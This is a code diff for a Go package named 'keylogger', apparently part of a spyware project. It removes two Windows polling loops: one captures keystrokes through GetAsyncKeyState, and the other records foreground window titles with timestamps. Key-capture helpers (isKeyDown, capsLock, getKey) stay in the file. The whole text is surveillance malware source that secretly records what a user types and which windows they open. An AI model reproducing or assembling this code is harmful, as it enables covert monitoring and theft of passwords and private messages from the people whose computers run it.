@@ -1,12 +1,7 @@
 package keylogger
 
 import (
-	"fmt"
 	"syscall"
-	"time"
-
-	"github.com/cinus-e/spy/internal/system"
-	"github.com/cinus-e/spy/internal/util"
 )
 
 const (
@@ -96,20 +91,6 @@ var (
 	procGetAsyncKeyState = user32.NewProc("GetAsyncKeyState")
 )
 
-func WindowLogger(data chan string) {
-	title := ""
-	for {
-		text := system.GetWindowText(system.GetForegroundWindow())
-		if text != "" {
-			if title != text {
-				title = text
-				data <- fmt.Sprintf("\n%s[%s]\n", util.Now(), text)
-			}
-		}
-		time.Sleep(3 * time.Millisecond)
-	}
-}
-
 func isKeyDown(key int) bool {
 	state, _, _ := procGetAsyncKeyState.Call(uintptr(key))
 	if state&(1<<15) != 0 {
@@ -124,22 +105,6 @@ func capsLock() bool {
 		return true
 	}
 	return false
-}
-
-func KeyLogger(data chan string) {
-	var lastKey string
-	for {
-		key := getKey(capsLock(), isKeyDown(vk_SHIFT))
-		if key != "" {
-			if key != lastKey {
-				data <- key
-				lastKey = key
-			}
-		} else {
-			lastKey = ""
-		}
-		time.Sleep(3 * time.Millisecond)
-	}
 }
 
 func getKey(caps, shift bool) string {
